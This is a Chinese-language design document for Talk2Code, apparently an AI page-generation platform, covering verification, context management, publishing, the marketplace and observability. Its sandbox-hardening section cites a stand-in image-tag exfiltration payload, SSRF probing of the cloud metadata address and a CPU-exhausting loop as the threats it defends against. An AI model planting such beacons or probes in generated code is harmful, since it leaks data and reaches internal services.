# Talk2Code 架构与设计

> 本文档是 README 的纵深补充，展开 Talk2Code 的工程质量体系与平台侧能力：
> 验收模型、交付门禁、跨文件契约、Plan DoD、上下文管线、记忆系统、服务端沙箱、
> 一键发布、创意市集、能力边界、准入与运营、可观测性与回归闭环。
> README 只保留概览，细节都在这里。

## 目录

- [代码质量验收系统](#代码质量验收系统)
- [交付门禁](#交付门禁)
- [跨文件 API 契约（导出闭合）](#跨文件-api-契约导出闭合)
- [Plan DoD 校验](#plan-dod-校验)
- [上下文效率优化](#上下文效率优化)
- [短期记忆 v2：上下文管线（L0–L5）](#短期记忆-v2上下文管线l0l5)
- [长期记忆系统](#长期记忆系统)
- [服务端沙箱加固](#服务端沙箱加固)
- [一键发布与发布后复验](#一键发布与发布后复验)
- [创意市集](#创意市集)
- [能力边界与动作级进度](#能力边界与动作级进度)
- [准入与运营（演示 / 邀请码 / 后台）](#准入与运营演示--邀请码--后台)
- [可观测性](#可观测性)
- [学习闭环](#学习闭环)
- [快速问答](#快速问答)
- [文档地图](#文档地图)

## 代码质量验收系统

Verify 节点采用 **确定性证据优先 + LLM 增量判断** 的证据等级模型：

**L0 环境契约（写入时刻拦截）**：
- 运行环境硬约束单一事实源 `constraints/environment_contract.py`（禁止 ES Module/CDN、
  存储兜底、入口可见、引用闭合），渲染注入 TL/Coder prompt，程序化检查供 Hook/lint 复用
- PRE_WRITE Hook 零 LLM 成本拦截 `<script type="module">`、外部 CDN、import/export——
  file:// 沙箱必炸的代码在写入瞬间就被打回，不再等浏览器报错

**L3 交互式验收**：
- LLM 将每条验收条件翻译为 Playwright DOM 操作序列（type/click/assert_exists...）
- 在 headless Chromium 中逐条执行，收集 passed/failed/截图
- 全部 AC 通过 + preview 零错误 → **快速通道 PASS**（跳过 LLM 深度评估；
  UI/代码质量诚实标记为未评估，截图落盘 `.task/evaluator/screenshot.png`）
- 结果实时推送到前端 Spec 面板（AC 级别 ✅/❌）

**L2 深度评估**（AC 未全通过时触发）：
- 双视角 LLM 评估（功能正确性 + 代码/UI 质量），5 维度 1-10 分
- 确定性证据定下限：冒烟缺陷/浏览器错误/AC 失败是机器实测事实，LLM 无权推翻为 PASS
- 未通过时缺陷按类别路由：架构类（模块加载/CDN/文件缺失）携带根因卡片回 Coder 重构，
  局部语法类走小上下文定向修复

**防假绿**：确定性缺陷（浏览器报错、harness 自身异常、契约断裂）不再被 LLM 的乐观判断
覆盖；不可信失败（沙箱环境抖动导致的失败）单独降噪，避免把平台故障算到作品头上。
详见 `docs/design/qa-verification-improvement.md`。

## 交付门禁

critical 缺陷未清零的需求不再自动放行为 finished_with_issues，而是转
**needs_user_input** 并附差异报告（未达成 AC 清单 + 关键缺陷明细）。
可用 `DELIVERY_GATE_STRICT=false` 关闭。Chat 人工修改路径同样有轻量闸门：
修改后自动跑一次冒烟，引入确定性缺陷则回滚本次修改并告知用户。

## 跨文件 API 契约（导出闭合）

多文件批量生成的最大风险是「A 文件调用了 B 文件没实现的方法」——页面不报错，
按钮静默失效（需求 124 事故：app.js 用了 utils.js 从没定义的 toast/copyText）。
三层确定性防护：

1. **计划期** `tl_analysis.md` 强制 tasks 声明 `exports`（每文件挂载到 window 的
   全局对象+方法清单）；`plan_validator` 校验被依赖的 js 未声明 exports 即打回。
2. **编码期** `build_api_contracts_section(plan)` 把 exports 渲染成「跨文件 API
   契约」注入 coder prompt——coder 只允许调用清单内方法，未声明能力必须在自己
   文件里实现。
3. **验收期** `check_cross_file_contract()`（确定性、零 LLM）解析各 JS 的实际
   导出与全项目引用，比对缺失；未定义的全局对象（如 `Game is not defined`）
   一并拦截。断裂属架构类缺陷，携根因卡片路由回 coder 重构；`classList` 动态
   类名与 CSS 无匹配则发警告。挂在 verify 冒烟 + task_complete 完成校验两道关。

## Plan DoD 校验

TeamLeader 产出的开发计划在进入 Coder 前经过程序化校验
（`constraints/plan_validator.py`）：文件引用闭合、每个任务有 purpose、
每条 AC 的 how_to_verify 含可操作动词、复杂度与文件数一致。
不合格打回 TL 重出最多 1 次；带病放行会记录弱 AC 清单供下游参考。

## 上下文效率优化

- **write_file 返回内容预览**：写入后返回前 80 行 + 尾 10 行，Agent 无需 read_file 验证
- **PRE_TOOL_USE Hook 真阻断**：写入后 2 轮内实际阻止对同一文件的回读
- **批量文件创建**：允许一次创建 2-3 个相关文件，消除"每次一个文件"的串行瓶颈
- **迭代上限文件数驱动**：standard 复杂度取 `min(文件数 + 3, 10)`（文件数至少按 3 计，
  故下限 6 轮、上限 10 轮；6 文件 → 9 轮）；simple 复杂度走固定 5 轮快速通道。
  早期是 `文件数×2+3`（6 文件能跑到 15 轮），实测过松已收紧
- **Coder 防空转**：四道防线（缺文件提醒、读写比、按文件累计读次、无进展熔断）都在
  `harness/runtime.py`。改阈值时的硬约束：迭代预算 = `min(文件数+3, 10)`，任何熔断的
  「最早可触发轮次」必须 ≤ 预算，否则变成死代码

## 短期记忆 v2：上下文管线（L0–L5）

放弃「事后压缩对话」，改为**按信息的可重建性分类治理**（权威设计说明见
`docs/design/context-pipeline-v2.md`）：

- **可重建**的（文件内容、工具输出）→ 允许遮蔽，需要时重新调工具拿回来，零信息损失
- **不可重建**的（需求、决策与理由、失败、对话）→ 永不丢弃，全量保留

```
L0 上游修复     dialogue_history 所有 role 有明确通道；preserve 标记透传
L1 稳定前缀     模板骨架 + 需求 + 计划摘要 + 接口契约（字节稳定 → 命中 KV-cache）
                可变尾段 = 工作区文件索引 + TASK_STATE.md（每轮重建，挂提示词末尾）
L2 任务状态     .task/TASK_STATE.md：Agent 通过 update_task_notes 自己维护
L3 工具结果     [3a] 单条 > SINGLE_RESULT_LIMIT → 截断 + 行号重读提示
                [3b] 预算驱动的存量遮蔽：装得下就一条不遮；装不下按「失效优先、
                     其次最旧」遮蔽 read_file，占位符带一句话摘要
L4 全历史       预算内全量装载（含全部对话，零消息丢弃），不再有固定条数硬上限
L5 Compaction   仅当 L4 装不下时，最旧段交 LLM 摘要注入为一条 summary（兜底，非常态）
```

关键常量：装载预算 24,000 token / 单条结果上限 2,000 / `KEEP_RECENT=3`
（最近 3 条 read_file 永不遮蔽）/ `KEEP_TAIL=6` / 过期阈值 2 次文件变更。

三条不可回退的设计取舍：

1. **绝不按文件名或内容语义去重** —— 实测会删掉真信息。
2. **状态由 Agent 写，harness 不做语义理解** —— harness 只检测「是否过期」，从不代写。
3. **前缀稳定优先于内容新鲜** —— 稳定前缀从第 2 轮起字节级不变，直接换 KV-cache 命中。

## 长期记忆系统

跨会话经验积累 — AI 会在任务前检索相关历史经验辅助编码，任务后自动总结关键模式供后续复用。
正负经验都沉淀：失败任务显式打 failure 标签、提高重要度，检索命中时以 ⚠️ 警示案例呈现，
避免同类缺陷重蹈覆辙。相似记忆定期由 LLM 合并去重。

检索侧有**相关性门禁**：低于阈值的记忆不注入，避免「检索到了但没关系」的噪声；
注入即记账（`memory_hits` 表），A/B 开关可对比开关效果。

## 服务端沙箱加固

服务端验收跑的是 LLM 刚写出来的 JS，此前 `preview_runner.py` 里 4 处 `p.chromium.launch()`
**没有任何隔离**——iframe sandbox 只约束子帧代码能碰什么，挡不住两件事：

1. **网络出口**：页面里 `<img src="http://x/?c=...">` 会以**服务器 IP** 发出 → 数据外带、
   SSRF 探内网（如 `169.254.169.254` 元数据服务）
2. **资源占用**：`while(true)` 吃满一个 CPU 核；并发 worker 有限，几发就能拖垮整机

统一收敛到 `harness/tools/sandboxed_browser.py`，全部 launch 点都走它：

```
--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1, EXCLUDE localhost
--proxy-server=http://127.0.0.1:9              # 黑洞代理
```

两个易错点都写进了测试：

- **`<-loopback>` 是减法**：它在 Chrome 的 bypass 语法里把「隐式 bypass loopback」这条
  规则**去掉**，方向正好相反，会把 127.0.0.1 的预览请求也送进黑洞代理。
- **`MAP * ~NOTFOUND` 的 `*` 会匹配数字 IP**：预览 URL 用的是 `http://127.0.0.1:5001`，
  所以 resolver 里必须显式 `EXCLUDE 127.0.0.1`，否则验收整片静默假绿。
  DNS 方向与代理方向**缺一不可**。

资源看护目前是 wall-clock watchdog（超时 `browser.close()` + 告警），不上 cgroup/setrlimit——
等真实事件发生再升级，避免复杂度与收益不成比例。

## 一键发布与发布后复验

三个分离撑起整个发布链路：

| 分离 | 为什么 | 落地形式 |
|---|---|---|
| slug ↔ 内容 | 改完再发，URL 必须不变 | `published_sites.slug` + `published_bundles.content_hash` 两张表 |
| 内容 ↔ 存储位置 | 今天本地目录，明天 COS/R2，迁移不改表 | `ObjectStore` protocol（3 个方法），v1 实现 `LocalFSStore` |
| 运行时 ↔ 路由 | 今天全静态，以后可能有容器 | `published_sites.runtime_tier`（v1 只有 0=static） |

- **幂等语义**：内容变了存新 bundle、`version += 1`、slug 不变；内容没变则零写入。
- **slug**：13 字节随机（104 bit）取高 100 bit → Crockford Base32 → 20 字符，字母表去掉
  `I/L/O/U` 避免手抄歧义；语义是**不可枚举**而非保密（拿到 slug 的人都能访问）。
- **发布后复验（必须做）**：预览是 opaque origin（无 `same-origin`，localStorage 必抛错），
  发布后放开同源 —— 两个环境不等价。发布完成会对真实 URL 重跑通用冒烟 + AC 脚本
  （脚本缓存在 `.task/ac_scripts.json`），失败标记 `degraded` 并明确提示，不假装成功。
  复验默认后台异步（`PUBLISH_VERIFY_ASYNC`）。
- **四条不可回退的安全约束**（`tests/unit/test_publish_host_isolation.py` 守卫）：
  ① 非 slug 子域一律 `return None`（**绝不能 404**，否则主站自身被误伤）；
  ② `JWT_COOKIE_DOMAIN` 必须为空（host-only cookie，已发布域永不承载登录态）；
  ③ 发布域名豁免限流；④ `.task/**` 打包侧与服务侧都挡。
- **badge 服务时注入**：不落盘、不进 `content_hash`（否则版本语义崩塌且幂等存储无法重装饰）；
  复验请求带 `X-T2C-Verify: 1` 跳过装饰，保证验收跑在纯净产物上。

## 创意市集

- **opt-in 上架**：`market_visible` 默认 False；上架与 `verify_status` 完全解耦
  （`degraded` 常常是平台复验环境异常，不该让作者背锅）。
- **热度**：`(去重访客×1 + 点赞×3 + 留言×2) / (小时+2)^1.5`，查询时计算不落列。
  用的是 `COUNT(DISTINCT fingerprint)` 而不是 `view_count`（后者刷新即 +1，会被刷穿）。
  对外只暴露取整后的热度，不暴露 `view_count` 与公式。
- **访客去重**：`sha256(salt + ip + ua + day)[:32]`，只存 hash、按天分桶。
- **origin 边界**：发布站是独立 origin，跨站带凭证请求被浏览器拒绝 ⇒ 发布站内只放跳转
  badge，点赞/留言/关注全部发生在主站 `/market`。
- **缩略图 URL 必须带版本参数**（列表与详情共用 `thumbs.thumb_url()`）：截图分支吃长缓存，
  URL 恒定时作者传完封面卡片仍显示旧截图。
- **未上架站点**不出现在公开列表；上架站点仍带 `X-Robots-Tag: noindex`。

## 能力边界与动作级进度

**边界三层**，缺一层链路就断：分类器 `OUT_OF_SCOPE` → 澄清环节 `data_scope` 问题 →
分类未命中时的兜底问题（`requirement_service.OUT_OF_SCOPE_QUESTIONS`）。
判据是「需求的核心价值是否建立在服务端能力上」；凡能用本地存储等价满足的仍是正常需求。
取舍是**不直接拒绝**——三个选项都写成可交付形态（本地存储版 / 内置示例数据 / 只做界面留接口）。

**动作级进度**：进度事件从「角色 + 百分比」扩展为「动作 + 阶段 + 百分比」
（正在创建 js/app.js / 已完成 2/4），并补齐编码期埋点。两条规则：文案描述动作不描述角色；
推送不设前提条件（契约只让文案能带 `(n/total)`）。`read_file` / `list_files` 刻意排除在
白名单外——高频且无进展信息，推送只会刷屏。静默超 15 秒显示「已等待 N 秒」。

**单轮长尾熔断**：实测 155 轮 LLM 调用中，慢轮次（>60s）占 20% 却吃掉 71% 的 LLM 时间，
输出却很短（中位 583 token）——是空转不是长输出。因此给单轮设预算（默认 45s，
`LLM_SLOW_TURN_TIMEOUT`）：首试关客户端重试，仅超时才用减半 `max_tokens` 降级重试一次，
第二次不设预算。配置为 0 时关闭。

**品类 Skill**：14 个声明式 Skill（11 knowledge + 3 workflow），正则确定性命中、零 LLM 成本。
6 个品类（crud / tool / dashboard / landing / admin / game）**互斥**，一个需求最多命中一个
（`tests/unit/test_skill_catalog.py` 守）。

## 准入与运营（演示 / 邀请码 / 后台）

- **演示模式**：以真实演示帐号身份登录，JWT 额外带 `demo:true` claim。后端
  `utils/demo_guard.py` 在 `before_request` 阶段**默认拒绝所有写方法**（白名单放行登录 /
  注册 / 邀请申请）。选默认拒绝而非「给 30 个接口贴装饰器」：漏贴的表现是**功能不可用**
  （立刻发现），而不是**数据被改**（几个月才发现）。前端置灰只是体验层。
- **邀请码**：单表 `invite_codes` 承载申请 → 审批 → 发放 → 核销；一次性 + 7 天有效。
  注册时在同一事务内用 `UPDATE ... WHERE status='issued'` 的 rowcount 抗并发（不靠先查再插）。
  错误文案统一「邀请码无效或已被使用」，不区分不存在/已用/已过期——区分了等于给攻击者
  一个枚举探针。
- **邮件发放与审批解耦**：SMTP 失败不影响审批成功，只记 `delivery_status=failed` 供后台重发；
  `SMTP_ENABLED=false` 时后台直接展示码明文，本地可完整跑通流程。
- **后台**：`admin_users` 独立表与 `users` 物理隔离（不给 `users` 加 `is_admin`，避免任何
  注册用户成为提权面）；管理员 token 走 Authorization header（2h），与前台 cookie 登录态
  互不覆盖（flask-jwt-extended 的 cookie 名是全局配置，两个登录态会互相覆盖）。
- **指标边界**：运营与业务指标一律走 `/api/admin/metrics`（需鉴权）；公开的
  `/api/metrics` 保持纯技术指标——Prometheus 抓取端点通常无鉴权，往里塞用户数等于公开运营数据。
  后台热度榜复用前台同一个 `compute_heat()`，不另造公式（否则出现「后台 87、前台 52」的信任崩塌）。

## 可观测性

目标：**每一次需求执行都可归因**。五条通道 + 两类端点（详见 `docs/observability-design.md`）：

| 通道 | 内容 |
|---|---|
| 应用日志 | `app` / `agent` / `llm` 三个文件，按模块互斥分流，按天轮转，统一在 `backend/logs/` |
| 链路追踪 | `agent_traces` 表，span 级耗时，trace 级 token 与成本汇总 |
| 成本统计 | 按 trace 累计 token 与费用，含 KV-cache 命中量 |
| 指标端点 | `/api/metrics`（Prometheus 文本）、`/api/health` 系列健康检查 |
| 执行明细 | `AGENT_EXEC_LOG=true` 时按需求输出 `logs/agent_exec/<req_id>.jsonl` |

原则：按需求聚合而非分流（全局性共因需要跨需求视图才能识别）；自研轻量实现，不引入
OpenTelemetry；**宁可低估不可高估**——统计口径取不到时归零，绝不产出看似漂亮的假数字。

排查入口：`grep 'req=76' backend/logs/*.log` → 从日志里的 `trace=xxx` 回查 `agent_traces`；
`logs/llm_traffic.log` 按 `call_id` 配对请求/响应，用于定位 400/500 与端点校验问题。

## 学习闭环

`eval/tasks/tasks.yaml` 里固化的 21 个回归任务，覆盖的都是**历史上真实踩过的坑**，
而不是凑数的样例：

- `t21` 贪吃蛇 —— 曾连续七次失败的失败模式专项
- `ENV-3` —— `file://` 下 ES Module 被 CORS 拦截（需求 #115 的直接死因）
- `ENV-2` —— 无网络沙箱里 CDN 必挂（#110–116 反复踩坑）

改 harness 核心时前后各跑一次基线做对照，用数据判断「这次改动到底更好还是更差」，
而不是靠感觉。

最近一次全量基线（2026-08-31）：20/21 通过（95.2%），唯一未通过项定位为上游模型端点读超时，
非架构缺陷。完整报告见 `eval/results/baseline_20260831_113741.md`，黄金基线在
`eval/baseline_golden.json`（CI 门禁对比用）。

标准命令（在 `backend/` 目录下执行）：

```bash
env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy \
    -u ALL_PROXY -u all_proxy PYTHONPATH=. \
    ../venv/bin/python ../eval/run_eval.py --no-preview
```

- 虚拟环境在**仓库根目录** `venv/`（不是 `backend/venv/`）；
- eval 是独立进程，必须显式清掉系统代理变量，否则会继承代理、导致 LLM 请求 ProxyError（同生产环境 req #134 根因）；
- `--no-preview` 跳过 Playwright 浏览器验收（仅跑 file/结构/内容断言），速度快、无 429 限流风险；
- 完整链路（含浏览器预览）去掉该开关即可，但耗时 30–60 分钟且端点有 429 限流风险；
- 预览验证在 headless Chromium 中**真实加载生成页面**，捕获 `pageerror` / `console_error` / `request_failed` 等运行时错误（含跨文件导出未定义导致的崩溃），与静态结构审计互补，构成「静态 + 运行时」双保险质量信号；
- trace 覆盖全流程：编码迭代 / verify 评估 / defect_repair 修复均有 span 可归因。

## 快速问答

简单技术问题走快速通道，直接回答不进入编码流水线，节省 Token 和响应时间。

## 路线图

**产品方向**（与 README 口径一致）：

- **对话式迭代** — 生成完成后继续用对话微调，改动落在已有代码上而不是整份重做；遇到需要取舍的地方把选项摆出来由用户拍板。
- **开放技能库** — 把内置的 14 个领域技能包开放出来，并支持编写自己的技能包，让生成结果贴合特定团队的技术栈与代码规范。
- **前后端一体生成** — 从只生成前端页面扩展到带接口与数据存储的完整应用。

**工程侧待办**：

- 验证阶段浏览器会话合并（当前一次验证启动 4 次 Chromium，需单独验证线程隔离机制）
- 进度事件落库（刷新页面后中间进度可恢复）
- 发布 Tier 1：静态 + 平台 API（KV / 文件上传，per-slug token），接口契约已预留
- 市集标签筛选、周榜、真截图缩略图（当前为 slug 派生色块 / 作者自传封面）
- 企业级部署：水平扩展、鉴权与审计

## 文档地图

| 文档 | 内容 |
|------|------|
| `README.md` / `README.en.md` | 项目概览、技术栈、快速开始、核心功能（中 / 英） |
| 本文档 | 工程质量体系与平台侧能力的纵深说明 |
| `docs/observability-design.md` | 可观测性五条通道与两类端点、日志字段与排查手法 |
| `docs/design/context-pipeline-v2.md` | 短期记忆 v2：L0–L5 上下文管线（**权威**，代码注释三处引用） |
| `docs/design/publish-and-sandbox.md` | 运行时沙箱加固 + 一键发布的设计依据与安全红线 |
| `docs/design/marketplace.md` | 创意市集：origin 边界、热度算法、badge 注入、注册引导 |
| `docs/design/capability-boundary-and-progress.md` | 能力边界、动作级进度、长尾熔断、品类 Skill |
| `docs/design/demo-invite-admin.md` | 演示模式 / 邀请码准入 / 运营后台 |
| `docs/design/qa-verification-improvement.md` | 防假绿、变异测试、不可信失败降噪 |
| `docs/design/harness-6layer-architecture.md` | Harness 6 层架构改造方案（**历史设计稿 2026-06**，引用路径已失效，仅供追溯决策） |
| `openspec/` | OpenSpec 规范驱动开发记录 |
